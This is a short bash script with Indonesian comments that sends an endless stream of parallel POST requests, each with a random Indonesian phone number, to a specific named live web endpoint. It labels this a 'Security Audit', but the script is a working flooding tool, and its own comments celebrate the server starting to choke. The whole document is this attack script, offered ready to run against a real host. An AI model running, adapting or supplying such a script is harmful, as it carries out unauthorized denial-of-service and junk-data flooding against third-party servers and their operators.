#!/bin/bash

# Target URL (Ganti dengan URL yang kamu temukan tadi)
TARGET_URL="https://palma.qzz.io/shpe/9ys/send.php"

echo "------------------------------------------"
echo "Starting Security Audit on: $TARGET_URL"
echo "Press [CTRL+C] to stop."
echo "------------------------------------------"

# Loop utama
while true; do
  for i in {1..5}; do
    (
      # Generate nomor HP random (10 digit setelah 08)
      RAND_NUM=$(head /dev/urandom | tr -dc 0-9 | head -c 10)
      PHONE="+628$RAND_NUM"

      # Kirim request POST
      RESPONSE=$(curl -s -X POST "$TARGET_URL" \
           -H "Content-Type: application/json" \
           -d "{\"phone\": \"$PHONE\"}")

      if [[ $RESPONSE == *"ok\":true"* ]]; then
        echo "[SUCCESS] Terkirim: $PHONE"
      else
        echo "[ERROR] Server mulai engap/error: $RESPONSE"
      fi
    ) & # Jalankan di background (Paralel)
  done

  wait # Tunggu batch isi 5 ini selesai
  echo "--- Batch selesai, istirahat 1 detik ---"
  sleep 1
done
